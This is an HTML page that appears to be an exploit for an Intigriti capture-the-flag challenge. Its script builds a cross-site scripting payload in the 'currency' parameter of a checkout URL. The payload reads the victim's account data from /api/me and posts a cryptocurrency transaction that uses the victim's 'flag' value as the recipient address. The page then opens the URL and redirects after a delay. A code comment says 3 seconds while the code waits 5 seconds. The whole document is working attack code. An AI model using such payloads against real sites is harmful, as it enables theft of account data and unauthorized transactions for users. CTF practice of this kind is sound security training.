<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. We craft a malicious checkout URL
        // We inject a script into the 'currency' parameter
        const payload = `BTC<img src=x onerror="fetch('/api/me').then(r=>r.json()).then(d=>{fetch('/api/transaction',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({toAddress:d.flag,currency:'BTC',amount:0.000001})})})">`;
        
        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html?currency=" + encodeURIComponent(payload) + "&price=1";

        // 2. Open the page as the Admin
        const win = window.open(targetUrl);

        // 3. After the transaction is sent (3 seconds), redirect to see the result
        setTimeout(() => {
            win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
        }, 5000);
    </script>
</body>
</html>
